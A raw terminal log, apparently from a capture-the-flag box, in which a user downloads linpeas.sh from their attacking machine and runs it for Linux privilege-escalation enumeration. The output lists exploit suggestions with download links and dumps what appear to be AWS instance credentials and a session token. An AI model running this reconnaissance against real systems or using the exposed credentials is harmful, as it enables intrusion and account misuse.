gdm       1947  0.0  1.3 385324 13964 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-datetime
gdm       1948  0.0  0.5 275344  5564 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-housekeeping
gdm       1960  0.0  2.1 498104 21380 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-keyboard
gdm       1963  0.0  2.3 1073420 23616 tty1    Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-media-keys
gdm       1976  0.0  0.4 193604  4600 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-mouse
gdm       1977  0.0  2.1 582448 21996 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-power
gdm       1980  0.0  0.8 258628  8792 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-print-notifications
gdm       1981  0.0  0.4 193624  4672 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-rfkill
gdm       1986  0.0  0.4 267340  4772 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-screensaver-proxy
gdm       1988  0.0  0.8 296640  8252 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-sharing
gdm       1991  0.0  0.9 443320  9168 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-smartcard
gdm       2001  0.0  0.7 326496  8020 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-sound
gdm       2004  0.0  2.1 420036 21176 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-wacom
colord    2053  0.0  1.3 316116 13628 ?        Ssl  04:10   0:00 /usr/lib/colord/colord
gdm       2122  0.0  0.5 196496  5912 tty1     Sl   04:10   0:00 /usr/lib/ibus/ibus-engine-simple
root      2208  0.0  0.0      0     0 ?        I    04:10   0:00 [kworker/u30:4]
root      4116  0.0  0.0      0     0 ?        I    04:35   0:00 [kworker/u30:2]
root      4583  0.0  0.7 110084  7224 ?        Ss   04:40   0:00 sshd: annie [priv]
annie     4662  0.0  0.7  76532  7476 ?        Ss   04:41   0:00 /lib/systemd/systemd --user
annie     4663  0.0  0.2 195556  2264 ?        S    04:41   0:00 (sd-pam)
annie     4694  0.0  0.3 110084  3460 ?        S    04:41   0:00 sshd: annie@pts/0
annie     4697  0.0  0.5  21384  5036 pts/0    Ss   04:41   0:00 -bash
root     31507  0.1  1.7 600048 18032 ?        Ssl  06:49   0:00 /usr/bin/anydesk --service
gdm      31510  0.1  2.1 724208 21504 ?        Ssl  06:49   0:00 /usr/bin/anydesk --tray
annie    31531  0.0  0.3  11600  3036 ?        Ss   06:49   0:00 /bin/bash /home/annie/.anydesk.sh
annie    31532  0.3  3.0 810700 30844 ?        Sl   06:49   0:00 /usr/bin/anydesk
annie    31542  0.0  0.2  45848  2352 ?        S    06:49   0:00 dbus-launch --autolaunch=9035659da70a4b8ebcd6691cfa3ab648 --binary-syntax --close-stderr
annie    31543  0.0  0.2  49804  2768 ?        Ss   06:49   0:00 /usr/bin/dbus-daemon --syslog-only --fork --print-pid 5 --print-address 7 --session
annie    31576  0.0  0.3  38380  3556 pts/0    R+   06:49   0:00 ps aux
annie    31577  0.0  0.0   6324   740 pts/0    S+   06:49   0:00 cat
annie@desktop:/usr/bin$ crontab -l
no crontab for annie
annie@desktop:/usr/bin$ ss -tulpn
Netid       State         Recv-Q        Send-Q                     Local Address:Port                Peer Address:Port        
udp         UNCONN        0             0                          127.0.0.53%lo:53                       0.0.0.0:*           
udp         UNCONN        0             0                     10.10.159.237%eth0:68                       0.0.0.0:*           
udp         UNCONN        0             0                                0.0.0.0:5353                     0.0.0.0:*           
udp         UNCONN        0             0                                0.0.0.0:50001                    0.0.0.0:*           
udp         UNCONN        0             0                                0.0.0.0:33696                    0.0.0.0:*           
udp         UNCONN        0             0                                   [::]:5353                        [::]:*           
udp         UNCONN        0             0                                   [::]:46993                       [::]:*           
tcp         LISTEN        0             1                                0.0.0.0:42725                    0.0.0.0:*           
tcp         LISTEN        0             128                        127.0.0.53%lo:53                       0.0.0.0:*           
tcp         LISTEN        0             128                              0.0.0.0:22                       0.0.0.0:*           
tcp         LISTEN        0             1                                0.0.0.0:7070                     0.0.0.0:*           
tcp         LISTEN        0             128                                 [::]:22                          [::]:*           
annie@desktop:/usr/bin$ netstat -antplue

Command 'netstat' not found, but can be installed with:

sudo apt install net-tools

annie@desktop:/usr/bin$ find / -type f -name root.txt 2> /dev/null
annie@desktop:/usr/bin$ find / -perm -u=s -type f 2>/dev/null
/sbin/setcap
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
/bin/umount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
annie@desktop:/usr/bin$ find / -perm -g=s -type f 2>/dev/null
/sbin/pam_extrausers_chkpwd
/sbin/unix_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/xorg/Xorg.wrap
/usr/lib/evolution/camel-lock-helper-1.2
/usr/bin/crontab
/usr/bin/chage
/usr/bin/ssh-agent
/usr/bin/wall
/usr/bin/mlocate
/usr/bin/bsd-write
/usr/bin/expiry
annie@desktop:/usr/bin$ cd /tmp
annie@desktop:/tmp$ ls -la
total 132
drwxrwxrwt 14 root  root   4096 Jun 18 07:08 .
drwxr-xr-x 22 root  root   4096 Mar 23  2022 ..
drwxrwxrwx  2 annie annie 69632 Jun 18 07:08 anydesk
drwxrwxrwt  2 root  root   4096 Jun 18 04:07 .font-unix
drwxrwxrwt  2 root  root   4096 Jun 18 04:10 .ICE-unix
drwx------  3 root  root   4096 Jun 18 04:10 systemd-private-11e4052e82ca477882892d3bed48908a-bolt.service-D8DPhg
drwx------  3 root  root   4096 Jun 18 04:10 systemd-private-11e4052e82ca477882892d3bed48908a-colord.service-j2iDBl
drwx------  3 root  root   4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-ModemManager.service-0HgELQ
drwx------  3 root  root   4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-rtkit-daemon.service-JWCwML
drwx------  3 root  root   4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-systemd-resolved.service-RpUcmG
drwx------  3 root  root   4096 Jun 18 04:07 systemd-private-11e4052e82ca477882892d3bed48908a-systemd-timesyncd.service-fC1O3e
drwxrwxrwt  2 root  root   4096 Jun 18 04:07 .Test-unix
-r--r--r--  1 gdm   gdm      11 Jun 18 04:10 .X1024-lock
-r--r--r--  1 root  root     11 Jun 18 04:07 .X10-lock
drwxrwxrwt  2 root  root   4096 Jun 18 04:10 .X11-unix
drwxrwxrwt  2 root  root   4096 Jun 18 04:07 .XIM-unix
annie@desktop:/tmp$ cd ~/annie
-bash: cd: /home/annie/annie: No such file or directory
annie@desktop:/tmp$ cd ~
annie@desktop:~$ ls -la
total 100
drwxr-xr-x 17 annie annie 4096 Jun 18 06:03 .
drwxr-xr-x  3 root  root  4096 Mar 23  2022 ..
drwxr-xr-x  3 annie annie 4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3771 Mar 23  2022 .bashrc
drwx------  8 annie annie 4096 Mar 23  2022 .cache
drwx------  9 annie annie 4096 Mar 23  2022 .config
drwx------  3 annie annie 4096 Mar 23  2022 .dbus
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Downloads
drwx------  3 annie annie 4096 Mar 23  2022 .gnupg
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
-rw-------  1 annie annie   32 Jun 18 06:03 .lesshst
drwx------  3 annie annie 4096 Mar 23  2022 .local
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Pictures
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Public
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Templates
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Videos
annie@desktop:~$ wget http://10.18.21.236:8000/enum/linpeas.sh
--2024-06-18 07:10:06--  http://10.18.21.236:8000/enum/linpeas.sh
Connecting to 10.18.21.236:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 860323 (840K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                      100%[=====================================================>] 840.16K  2.76MB/s    in 0.3s    

2024-06-18 07:10:07 (2.76 MB/s) - ‘linpeas.sh’ saved [860323/860323]

annie@desktop:~$ ls -la
total 944
drwxr-xr-x 17 annie annie   4096 Jun 18 07:10 .
drwxr-xr-x  3 root  root    4096 Mar 23  2022 ..
drwxr-xr-x  3 annie annie   4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie     41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie      9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie    220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie   3771 Mar 23  2022 .bashrc
drwx------  8 annie annie   4096 Mar 23  2022 .cache
drwx------  9 annie annie   4096 Mar 23  2022 .config
drwx------  3 annie annie   4096 Mar 23  2022 .dbus
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Downloads
drwx------  3 annie annie   4096 Mar 23  2022 .gnupg
-rw-------  1 annie annie    640 Mar 23  2022 .ICEauthority
-rw-------  1 annie annie     32 Jun 18 06:03 .lesshst
-rw-rw-r--  1 annie annie 860323 Apr 23 06:12 linpeas.sh
drwx------  3 annie annie   4096 Mar 23  2022 .local
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Pictures
-rw-r--r--  1 annie annie    807 Mar 23  2022 .profile
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Public
-rw-r--r--  1 root  root      66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie      0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Templates
-rw-rw-r--  1 annie annie     23 Mar 23  2022 user.txt
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 Videos
annie@desktop:~$ sh linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                       
    |---------------------------------------------------------------------------------|                                       
    |         Follow on Twitter         :     @hacktricks_live                        |                                       
    |         Respect on HTB            :     SirBroccoli                             |                                       
    |---------------------------------------------------------------------------------|                                       
    |                                 Thank you!                                      |                                       
    \---------------------------------------------------------------------------------/                                       
          linpeas-ng by github.com/PEASS-ng                                                                                   
                                                                                                                              
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                
                                                                                                                              
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                      
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                           
                               ╚═══════════════════╝                                                                          
OS: Linux version 4.15.0-173-generic (buildd@lcy02-amd64-094) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #182-Ubuntu SMP Fri Mar 18 15:53:46 UTC 2022
User & Groups: uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
Hostname: desktop
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                         
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
                                                                                                                              
                                                                                                                              

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                              
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                            
                              ╚════════════════════╝                                                                          
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                            
Linux version 4.15.0-173-generic (buildd@lcy02-amd64-094) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #182-Ubuntu SMP Fri Mar 18 15:53:46 UTC 2022
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.6 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                               
Sudo version 1.8.21p2                                                                                                         


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                       
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                            

╔══════════╣ Date & uptime
Tue Jun 18 07:10:38 PDT 2024                                                                                                  
 07:10:38 up  3:03,  1 user,  load average: 0.15, 0.03, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                          

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                     
UUID=1ab9ba02-9fd9-4f68-8c44-035973d925a8       /       ext4    errors=remount-ro       0 1                                   

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                       
LESSOPEN=| /usr/bin/lesspipe %s                                                                                               
HISTFILESIZE=0
MAIL=/var/mail/annie
USER=annie
SSH_CLIENT=10.18.21.236 40296 22
LANGUAGE=en_US:
SHLVL=1
HOME=/home/annie
OLDPWD=/tmp
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
LOGNAME=annie
_=/bin/sh
XDG_SESSION_ID=71
TERM=xterm-256color
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/home/annie
SSH_CONNECTION=10.18.21.236 40296 10.10.159.237 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                        
dmesg Not Found                                                                                                               
                                                                                                                              
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                            
[+] [CVE-2021-4034] PwnKit                                                                                                    

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                       
                                                                                                                              
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                 
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                      
═╣ PaX bins present? .............. PaX Not Found                                                                             
═╣ Execshield enabled? ............ Execshield Not Found                                                                      
═╣ SELinux enabled? ............... sestatus Not Found                                                                        
═╣ Seccomp enabled? ............... disabled                                                                                  
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)                                                                                 

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                           
                                   ╚═══════════╝                                                                              
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?                                                                                                
╔══════════╣ Container details                                                                                                
═╣ Is this a container? ........... No                                                                                        
═╣ Any running containers? ........ No                                                                                        
                                                                                                                              

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                           
                                     ╚═══════╝                                                                                
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
grep: /etc/motd: No such file or directory
═╣ AWS EC2? ............................. Yes
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ Aliyun ECS? .......................... No
grep: /etc/cloud/cloud.cfg: No such file or directory
═╣ Tencent CVM? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No

linpeas.sh: 2471: linpeas.sh: curl: not found
╔══════════╣ AWS EC2 Enumeration
ami-id: ami-0b431f4a118a58544                                                                                                 
instance-action: none
instance-id: i-0c6a2cd3e93e85aa2
instance-life-cycle: spot
instance-type: t2.micro
region: eu-west-1

══╣ Account Info
{                                                                                                                             
  "Code" : "Success",
  "LastUpdated" : "2024-06-18T13:58:03Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:26:d4:58:bd:db/                                                                                                       
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role
                                                                                                                              

══╣ User Data
                                                                                                                              

EC2 Security Credentials
{
  "Code" : "Success",
  "LastUpdated" : "2024-06-18T13:57:59Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA2YR2KKQM3Z3KABOZ",
  "SecretAccessKey" : "ResU0b5gKcL3XKh71jV1IDHPLL7+gJWier+pdBNl",
  "Token" : "IQoJb3JpZ2luX2VjEG4aCWV1LXdlc3QtMSJGMEQCIEuyuq2yuMaJdI8+Idy77NUUSzT3LnWaWshpAvqpRWdEAiACoUzv5NeVujjvZJ8Ka5ClZM5krQIEWnmqBxdsbbX+zirGBAgXEAMaDDczOTkzMDQyODQ0MSIMyuPrz2JkEdto+tKcKqME0N3WnQjrvLIj8bw/BTzP32ON9fxRRDFkTDryOxacKJ41ceSXcfdEOOXjU0ZQmO/oYeBiiu79UyD2EKz0DhgGvQ6Xo1WTAvqcLAOgqJXA39yfw0KYLjlBtwpPobSkJCK47OTnlOMQzaBYWNe7YedTXscv0FYya5vVl+EiiKd6iw/0W4Zyl/IdCQwnOIlp0UpDiU65XY0Hy5ugrzlQ/of0GFCHMpk0XHewjxSnnmTjc3CZxa6ATJkoibIHOyRkRsLiMNU296YLhcUwkG7vp23/m0+7mdRQAjc9nePmSrJuEiKRaPF/WlfJyInuyr/1ezoLNju9Mq790V7KtvGyqE61OuOJ6t/ELdbGhXaICBlwx9vXY30DrrQEGgcrZRq+fx414t2NhmozTVUIJYAPGxiYVl6RwXBCWJepu/6byBR4ImsSK2+mbl76PGOnDSdxqMjnGTXv56CboUuilPRqfZur7wUjAw9zBLO1jveE4+I0eSbP/NGwwNz+Cw8h/l9wk+jwpxOLlCXtJm0Ne2wmMNIYPKELy1qSO/JAlwkLr2CwRkNRvrNAlcj0QA00GVLv1pRxU47Jjhn4JYQw6F1AbZY4dXC2xLirzAQjq6hRYjXJzSzl1jiz4BzEl0+BOmbHPN/lweuDH+U9ysT+zDEDml1WZhdBJ3EaRSCtM0OM6nD/sY6CGnGrT3Fqtg/nh4xk7kr5Sf8PgmAB880znfAl5NBaybqAHTDepMazBjqUAg78LmEcrRUzTERQN8NshEkwpsp9jkVDhs3ginwGGLDTxuEN3yL9W03lKWjuEb5ccd7VRtMfgXS00imRMVgza1vyX1mzc5cjCd7jZgkmwrvVgAOYm/f+/gE3GWe9npFTOFnr2q7b2gLHqkIvmIL0Vew7R00g+93c0xv+D